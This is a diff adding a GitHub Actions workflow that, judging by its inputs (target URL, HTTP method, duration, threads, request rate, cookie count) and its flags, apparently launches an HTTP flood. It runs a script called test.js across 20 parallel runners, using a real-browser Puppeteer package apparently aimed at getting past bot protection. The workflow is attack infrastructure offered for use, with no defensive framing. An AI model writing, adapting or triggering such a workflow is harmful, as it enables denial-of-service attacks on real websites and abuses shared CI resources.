@@ -1,1 +1,54 @@
-404: Not Found
+name: Run xb.js
+
+on:
+  workflow_dispatch:
+    inputs:
+      mdata:
+        description: "HTTP Method"
+        required: true
+        type: string
+      url:
+        description: "Target URL"
+        required: true
+        type: string
+      time:
+        description: "Time"
+        required: true
+        type: number
+      threads:
+        description: "Threads"
+        required: true
+        type: number
+      rate:
+        description: "Rate"
+        required: true
+        type: number
+      cookiecount:
+        description: "CookieCount"
+        required: true
+        type: number
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm install puppeteer-real-browser hpack axios
+      - run: |
+          sudo apt update
+          sudo apt install -y wget gnupg ca-certificates
+          wget -qO- https://dl.google.com/linux/linux_signing_key.pub | sudo gpg --dearmor -o /usr/share/keyrings/google.gpg
+          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/google.gpg] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+          sudo apt update
+          sudo apt install -y google-chrome-stable
+      - run: echo "CHROME_PATH=/usr/bin/google-chrome" >> $GITHUB_ENV
+      - run: echo "PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome" >> $GITHUB_ENV
+      - run: chmod +x test.js
+      - run: node test.js "${{ inputs.mdata }}" "${{ inputs.url }}" "${{ inputs.time }}" "${{ inputs.threads }}" "${{ inputs.rate }}" "${{ inputs.cookiecount }}" --query 1 --debug true --bfm true --http mix
